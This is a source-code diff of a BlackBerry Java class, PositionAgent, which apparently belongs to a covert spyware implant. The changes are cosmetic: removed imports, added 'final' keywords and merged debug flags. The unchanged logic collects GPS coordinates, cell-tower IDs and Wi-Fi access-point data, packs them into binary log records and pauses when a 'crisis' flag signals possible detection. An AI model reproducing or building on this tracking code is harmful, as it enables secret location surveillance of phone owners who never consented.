@@ -14,20 +14,16 @@ import java.util.Date;
 
 import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationException;
-import javax.microedition.location.LocationListener;
 import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.GPRSInfo;
-import net.rim.device.api.system.Radio;
 import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.WLANInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.system.WLANInfo.WLANAPInfo;
-import net.rim.device.api.ui.text.HexadecimalTextFilter;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
 import blackberry.Device;
@@ -41,7 +37,6 @@ import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
-import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -115,7 +110,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
         if (gpsEnabled) {
 
-            Criteria criteria = new Criteria();
+            final Criteria criteria = new Criteria();
             criteria.setCostAllowed(true);
 
             criteria.setHorizontalAccuracy(50);
@@ -124,14 +119,14 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
             try {
                 lp = LocationProvider.getInstance(criteria);
-            } catch (Exception e) {
-                //#ifdef DEBUG_ERROR
+            } catch (final Exception e) {
+                //#ifdef DEBUG
                 debug.error(e);
                 //#endif
             }
 
             if (lp == null) {
-                //#ifdef DEBUG_ERROR
+                //#ifdef DEBUG
                 debug.error("GPS Not Supported on Device");
                 //#endif               
 
@@ -140,7 +135,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
         }
 
         if (gpsEnabled && lp != null) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("actualStart: logGps.createLog");
             //#endif
             //logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
@@ -148,7 +143,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
         }
         if (cellEnabled) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("actualStart: logCell.createLog");
             //#endif
             /*
@@ -168,31 +163,31 @@ public final class PositionAgent extends Agent implements LocationObserver {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
 
-        if(Status.getInstance().crisisPosition()){
-            //#ifdef DEBUG_WARN
+        if (Status.getInstance().crisisPosition()) {
+            //#ifdef DEBUG
             debug.warn("Crisis!");
             //#endif
             return;
         }
-        
+
         if (gpsEnabled) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("actualRun: gps");
             //#endif
             locationGPS();
         }
         if (cellEnabled) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("actualRun: cell");
             //#endif
             locationCELL();
         }
         if (wifiEnabled) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("actualRun: wifi");
             //#endif
             locationWIFI();
@@ -203,19 +198,19 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
         if (gpsEnabled) {
             if (lp != null) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("actualStop: resetting ");
                 //#endif
                 //lp.setLocationListener(null, -1, -1, -1);
                 lp.reset();
             }
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("actualStop: closing logGps");
             //#endif
             //logGps.close();
         }
         if (cellEnabled) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("actualStop: closing logCell");
             //#endif
             //logCell.close();
@@ -229,18 +224,18 @@ public final class PositionAgent extends Agent implements LocationObserver {
     private void locationWIFI() {
         final WLANAPInfo wifi = WLANInfo.getAPInfo();
         if (wifi != null) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Wifi: " + wifi.getBSSID());
             //#endif
-            byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(),
-                    wifi.getSignalLevel());
+            final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi
+                    .getSSID(), wifi.getSignalLevel());
 
             logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI),
                     LogType.LOCATION_NEW);
             logWifi.writeLog(payload);
             logWifi.close();
         } else {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("Wifi disabled");
             //#endif
         }
@@ -275,12 +270,12 @@ public final class PositionAgent extends Agent implements LocationObserver {
             mb.append(" MNC: " + mnc);
             mb.append(" LAC: " + lac);
             mb.append(" CID: " + cid);
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info(mb.toString());
             //#endif
 
             if (mcc != 0) {
-                byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
                 logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
                         LogType.LOCATION_NEW);
@@ -305,12 +300,12 @@ public final class PositionAgent extends Agent implements LocationObserver {
             mb.append(" NID: " + nid);
             mb.append(" BID: " + bid);
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info(mb.toString());
             //#endif
 
             if (sid != 0) {
-                byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+                final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
                 logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
                         LogType.LOCATION_NEW);
                 saveLog(logCell, payload, LOG_TYPE_CDMA);
@@ -324,14 +319,14 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     private void locationGPS() {
         if (lp == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("GPS Not Supported on Device");
             //#endif               
             return;
         }
 
         if (waitingForPoint) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
@@ -344,7 +339,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     }
 
     public synchronized void newLocation(Location loc) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("newLocation");
         //#endif
 
@@ -353,30 +348,30 @@ public final class PositionAgent extends Agent implements LocationObserver {
         //#endif
 
         if (loc == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Error in getLocation");
             //#endif  
             return;
         }
 
-        float speed = loc.getSpeed();
-        float course = loc.getCourse();
+        final float speed = loc.getSpeed();
+        final float course = loc.getCourse();
 
-        QualifiedCoordinates qc = loc.getQualifiedCoordinates();
+        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
         if (qc == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Cannot get QualifiedCoordinates");
             //#endif
             return;
         }
 
-        long timestamp = loc.getTimestamp();
+        final long timestamp = loc.getTimestamp();
 
         if (loc.isValid()) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("valid");
             //#endif
-            byte[] payload = getGPSPayload(qc, loc, timestamp);
+            final byte[] payload = getGPSPayload(qc, loc, timestamp);
 
             logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
                     LogType.LOCATION_NEW);
@@ -388,11 +383,11 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     private byte[] getAdditionalData(int structNum, int type) {
 
-        int addsize = 12;
-        byte[] additionalData = new byte[addsize];
+        final int addsize = 12;
+        final byte[] additionalData = new byte[addsize];
         final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
                 additionalData.length, false);
-        int version = 2010082401;
+        final int version = 2010082401;
 
         addbuffer.writeInt(version);
         addbuffer.writeInt(type);
@@ -412,17 +407,17 @@ public final class PositionAgent extends Agent implements LocationObserver {
         Check.requires(payload != null, "saveLog payload!= null");
         //#endif
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("saveLog payload: " + payload.length);
         //#endif
 
-        int version = 2008121901;
-        int delimiter = 0xABADC0DE;
-        Date date = new Date();
-        int payloadSize = payload.length;
-        int size = payloadSize + 24;
+        final int version = 2008121901;
+        final int delimiter = 0xABADC0DE;
+        final Date date = new Date();
+        final int payloadSize = payload.length;
+        final int size = payloadSize + 24;
 
-        byte[] message = new byte[size];
+        final byte[] message = new byte[size];
 
         final DataBuffer databuffer = new DataBuffer(message, 0, size, false);
 
@@ -450,19 +445,19 @@ public final class PositionAgent extends Agent implements LocationObserver {
     }
 
     private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid
                 + " signal:" + signalLevel);
         //#endif
-        int size = 48;
-        byte[] payload = new byte[size];
+        final int size = 48;
+        final byte[] payload = new byte[size];
 
         final DataBuffer databuffer = new DataBuffer(payload, 0,
                 payload.length, false);
 
         for (int i = 0; i < 6; i++) {
-            byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
-            //#ifdef DEBUG_TRACE
+            final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
+            //#ifdef DEBUG
             //debug.trace("getWifiPayload " + i + " : "
             //        + Utils.byteArrayToHex(token));
             //#endif
@@ -479,15 +474,15 @@ public final class PositionAgent extends Agent implements LocationObserver {
         databuffer.writeByte(0);
         databuffer.writeByte(0);
 
-        byte[] ssidcontent = ssid.getBytes();
-        int len = ssidcontent.length;
-        byte[] place = new byte[32];
+        final byte[] ssidcontent = ssid.getBytes();
+        final int len = ssidcontent.length;
+        final byte[] place = new byte[32];
 
         for (int i = 0; i < (Math.min(32, len)); i++) {
             place[i] = ssidcontent[i];
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length);
         //#endif
         databuffer.writeInt(ssidcontent.length);
@@ -510,8 +505,8 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {
 
-        int size = 19 * 4 + 48 + 16;
-        byte[] cellPosition = new byte[size];
+        final int size = 19 * 4 + 48 + 16;
+        final byte[] cellPosition = new byte[size];
 
         final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
                 cellPosition.length, false);
@@ -558,25 +553,25 @@ public final class PositionAgent extends Agent implements LocationObserver {
      */
     private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc,
             long timestamp) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getGPSPayload");
         //#endif
-        Date date = new Date(timestamp);
+        final Date date = new Date(timestamp);
 
-        double latitude = qc.getLatitude();
-        double longitude = qc.getLongitude();
-        float altitude = qc.getAltitude();
-        float hdop = qc.getHorizontalAccuracy();
-        float vdop = qc.getVerticalAccuracy();
-        float speed = loc.getSpeed();
-        float course = loc.getCourse();
+        final double latitude = qc.getLatitude();
+        final double longitude = qc.getLongitude();
+        final float altitude = qc.getAltitude();
+        final float hdop = qc.getHorizontalAccuracy();
+        final float vdop = qc.getVerticalAccuracy();
+        final float speed = loc.getSpeed();
+        final float course = loc.getCourse();
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|"
                 + course + "|" + date);
         //#endif
 
-        DateTime dateTime = new DateTime(date);
+        final DateTime dateTime = new DateTime(date);
 
         //  #define GPS_VALID_UTC_TIME                                 0x00000001
         //  #define GPS_VALID_LATITUDE                                 0x00000002
@@ -585,12 +580,12 @@ public final class PositionAgent extends Agent implements LocationObserver {
         //  #define GPS_VALID_HEADING                                  0x00000010
         //  #define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
         //  #define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
-        int validFields = 0x00000400 | 0x00000200 | 0x00000010 | 0x00000008
-                | 0x00000004 | 0x00000002 | 0x00000001;
+        final int validFields = 0x00000400 | 0x00000200 | 0x00000010
+                | 0x00000008 | 0x00000004 | 0x00000002 | 0x00000001;
 
-        int size = 344;
+        final int size = 344;
         // struct GPS_POSITION
-        byte[] gpsPosition = new byte[size];
+        final byte[] gpsPosition = new byte[size];
 
         final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
                 gpsPosition.length, false);
@@ -630,7 +625,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
         databuffer.write(new byte[48]); // azimuth view
         databuffer.write(new byte[48]); // sn view
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("len: " + databuffer.getPosition());
         //#endif
 
@@ -652,12 +647,12 @@ public final class PositionAgent extends Agent implements LocationObserver {
         try {
             //millisecondi
             period = databuffer.readInt();
-            int type = databuffer.readInt();
+            final int type = databuffer.readInt();
 
             if (Conf.GPS_ENABLED) {
                 gpsEnabled = ((type & TYPE_GPS) != 0);
             } else {
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("GPS Disabled at compile time");
                 //#endif
             }
@@ -669,7 +664,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             // Check.asserts(type == 1 || type == 2 || type == 4, "parse type: " + type);
             //#endif
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Type: " + type);
             debug.info("Period: " + period);
             debug.info("gpsEnabled: " + gpsEnabled);
@@ -681,7 +676,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
             setDelay(period);
 
         } catch (final EOFException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
             return false;
@@ -695,7 +690,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
     }
 
     public void errorLocation() {
-        //#ifdef DEBUG_ERROR
+        //#ifdef DEBUG
         debug.error("errorLocation");
         //#endif
     }
